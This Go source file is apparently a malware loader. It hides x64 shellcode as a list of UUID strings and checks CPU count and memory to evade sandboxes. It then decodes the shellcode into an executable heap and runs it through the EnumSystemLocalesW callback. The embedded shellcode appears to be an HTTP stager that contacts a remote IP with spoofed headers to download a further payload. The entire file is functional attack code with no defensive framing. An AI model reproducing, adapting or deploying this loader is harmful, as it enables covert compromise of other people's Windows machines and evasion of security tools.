/*
Author: Crispr
*/
package main

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT                 = 0x1000
	HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	PAGE_EXECUTE_READWRITE     = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
)

var (
	ntdll                   = windows.NewLazyDLL("ntdll.dll")
	kernel32                = windows.NewLazyDLL("kernel32.dll")
	ZwAllocateVirtualMemory = ntdll.NewProc("ZwAllocateVirtualMemory")
	rpcrt4                  = syscall.MustLoadDLL("rpcrt4.dll")
	UuidFromStringA         = rpcrt4.MustFindProc("UuidFromStringA")
	HeapCreate              = kernel32.NewProc("HeapCreate")
	HeapAlloc               = kernel32.NewProc("HeapAlloc")
	EnumSystemLocalesW      = kernel32.NewProc("EnumSystemLocalesW")
	//uuids                   []string = []string{"e48148fc-fff0-ffff-e8cc-000000415141", "31485250-65d2-8b48-5260-488b5218488b", "56512052-8b48-5072-4d31-c9480fb74a4a", "acc03148-613c-027c-2c20-41c1c90d4101", "52ede2c1-8b48-2052-8b42-3c41514801d0", "18788166-020b-850f-7200-00008b808800", "85480000-74c0-4867-01d0-508b4818448b", "01492040-e3d0-4d56-31c9-48ffc9418b34", "d6014888-3148-acc0-41c1-c90d4101c138", "4cf175e0-4c03-0824-4539-d175d858448b", "01492440-66d0-8b41-0c48-448b401c4901", "048b41d0-4888-d001-4158-41585e595a41", "41594158-485a-ec83-2041-52ffe0584159", "128b485a-4be9-ffff-ff5d-49be7773325f", "00003233-5641-8949-e648-81eca0010000", "48e58949-c031-5050-49c7-c40200386c41", "e4894954-894c-41f1-ba4c-772607ffd54c", "0168ea89-0001-5900-41ba-29806b00ffd5", "5059026a-4d50-c931-4d31-c048ffc04889", "eaba41c2-df0f-ffe0-d548-89c76a104158", "48e2894c-f989-ba41-c2db-3767ffd54831", "f98948d2-ba41-e9b7-38ff-ffd54d31c048", "8948d231-41f9-74ba-ec3b-e1ffd54889f9", "41c78948-75ba-4d6e-61ff-d54881c4b002", "83480000-10ec-8948-e24d-31c96a044158", "41f98948-02ba-c8d9-5fff-d54883c4205e", "406af689-5941-0068-1000-0041584889f2", "41c93148-58ba-53a4-e5ff-d54889c34989", "c9314dc7-8949-48f0-89da-4889f941ba02", "ff5fc8d9-48d5-c301-4829-c64885f675e1", "58e7ff41-006a-4959-c7c2-f0b5a256ffd5"}
	uuids []string = []string{"e48348fc-e8f0-00c8-0000-415141505251", "d2314856-4865-528b-6048-8b5218488b52", "728b4820-4850-b70f-4a4a-4d31c94831c0", "7c613cac-2c02-4120-c1c9-0d4101c1e2ed", "48514152-528b-8b20-423c-4801d0668178", "75020b18-8b72-8880-0000-004885c07467", "50d00148-488b-4418-8b40-204901d0e356", "41c9ff48-348b-4888-01d6-4d31c94831c0", "c9c141ac-410d-c101-38e0-75f14c034c24", "d1394508-d875-4458-8b40-244901d06641", "44480c8b-408b-491c-01d0-418b04884801", "415841d0-5e58-5a59-4158-4159415a4883", "524120ec-e0ff-4158-595a-488b12e94fff", "6a5dffff-4900-77be-696e-696e65740041", "e6894956-894c-41f1-ba4c-772607ffd548", "3148c931-4dd2-c031-4d31-c94150415041", "79563aba-ffa7-e9d5-9300-00005a4889c1", "1f48b841-0000-314d-c941-5141516a0341", "57ba4151-9f89-ffc6-d5eb-795b4889c148", "8949d231-4dd8-c931-5268-0032c0845252", "55ebba41-3b2e-d5ff-4889-c64883c3506a", "89485f0a-baf1-001f-0000-6a0068803300", "e0894900-b941-0004-0000-41ba75469e86", "8948d5ff-48f1-da89-49c7-c0ffffffff4d", "5252c931-ba41-062d-187b-ffd585c00f85", "0000019d-ff48-0fcf-848c-010000ebb3e9", "000001e4-82e8-ffff-ff2f-6a7175657279", "332e332d-322e-732e-6c69-6d2e6d696e2e", "3b00736a-cf29-6063-d1c3-767ca2682204", "c74b2ba2-2130-3336-5db8-264e55f69fed", "d7766342-2fd5-657d-0485-cef31c60ddc9", "a40f081e-d754-b7e9-0041-63636570743a", "78657420-2f74-7468-6d6c-2c6170706c69", "69746163-6e6f-782f-6874-6d6c2b786d6c", "7070612c-696c-6163-7469-6f6e2f786d6c", "303d713b-392e-2a2c-2f2a-3b713d302e38", "63410a0d-6563-7470-2d4c-616e67756167", "65203a65-2d6e-5355-2c65-6e3b713d302e", "480a0d35-736f-3a74-2074-69616e79612e", "64696162-2e75-6f63-6d0d-0a5265666572", "203a7265-7468-7074-3a2f-2f636f64652e", "6575716a-7972-632e-6f6d-2f0d0a416363", "2d747065-6e45-6f63-6469-6e673a20677a", "202c7069-6564-6c66-6174-650d0a557365", "67412d72-6e65-3a74-204d-6f7a696c6c61", "302e352f-2820-6957-6e64-6f7773204e54", "332e3620-203b-7254-6964-656e742f372e", "72203b30-3a76-3131-2e30-29206c696b65", "63654720-6f6b-0a0d-00f5-a0c2c27fef9f", "7cf12e44-74dd-cf73-e267-eaa41c6c1821", "6cfbab03-0bfa-f915-0041-bef0b5a256ff", "c93148d5-00ba-4000-0041-b80010000041", "000040b9-4100-58ba-a453-e5ffd5489353", "e7894853-8948-48f1-89da-41b800200000", "41f98949-12ba-8996-e2ff-d54883c42085", "66b674c0-078b-0148-c385-c075d7585858", "0faf0548-0000-c350-e87f-fdffff34372e", "322e3539-3931-392e-3600-1969a08d0000"}
)

func strPtr(s string) uintptr {
	return uintptr(unsafe.Pointer(&s))
}

func numverofCPU() (int, error) {
	num_of_cpu := runtime.NumCPU()
	if num_of_cpu < 4 {
		return 0, nil
	} else {
		return 1, nil
	}
}

func timeSleep() (int, error) {
	startTime := time.Now()
	time.Sleep(10 * time.Second)
	endTime := time.Now()
	sleepTime := endTime.Sub(startTime)
	if sleepTime >= time.Duration(10*time.Second) {
		return 1, nil
	} else {
		return 0, nil
	}
}

func physicalMemory() (int, error) {
	var mod = syscall.NewLazyDLL("kernel32.dll")
	var proc = mod.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	mem = mem / 1048576
	if mem < 4 {
		return 0, nil
	}
	return 1, nil
}

func main() {
	num, _ := numverofCPU()
	mem, _ := physicalMemory()
	if num == 0 || mem == 0 {
		fmt.Printf("Hello Crispr")
		os.Exit(1)
	}

	var err error

	if err != nil {
		log.Fatal(err)
	}

	if err != nil {
		log.Fatal(err)
	}

	addr, _, err := HeapCreate.Call(uintptr(HEAP_CREATE_ENABLE_EXECUTE), 0, 0)
	if addr == 0 || err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))
	}

	ZwAllocateVirtualMemory.Call(addr, 0, 0, 0x100000, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	addrPtr := addr
	for _, uuid := range uuids {
		u := append([]byte(uuid), 0)
		rpcStatus, _, err := UuidFromStringA.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
		if rpcStatus != 0 {
			log.Fatal(fmt.Sprintf("There was an error calling UuidFromStringA:\r\n%s", err))
		}
		addrPtr += 16
	}
	EnumSystemLocalesW.Call(addr, 0)
	//syscall.Syscall(addr, 0, 0, 0, 0)
}
